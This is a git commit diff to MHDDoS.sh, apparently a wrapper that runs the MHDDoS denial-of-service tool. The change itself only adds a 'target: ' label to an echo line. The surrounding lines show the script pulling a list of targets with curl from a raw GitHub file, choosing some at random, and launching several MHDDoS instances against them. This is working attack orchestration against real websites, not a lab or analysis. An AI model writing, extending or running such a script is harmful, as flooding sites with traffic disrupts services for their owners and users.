2e46e78f1ae0547e39f34565da9ef32bc7f54148
KarboDuck <53382906+KarboDuck@users.noreply.github.com>
2022-03-13 12:45:37 +0200

    Update MHDDoS.sh

--- MHDDoS.sh
+++ MHDDoS.sh
@@ -48,7 +48,7 @@ do
    for i in $random_numbers
    do
              site=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/MHDDoS_targets | cat | tail -n +6)")
-             echo -e $site"\n"
+             echo -e "target: "$site"\n"
    done
       
    # Launch multiple MHDDoS instances. Targets choosed based on previosly generated list of random numbers.
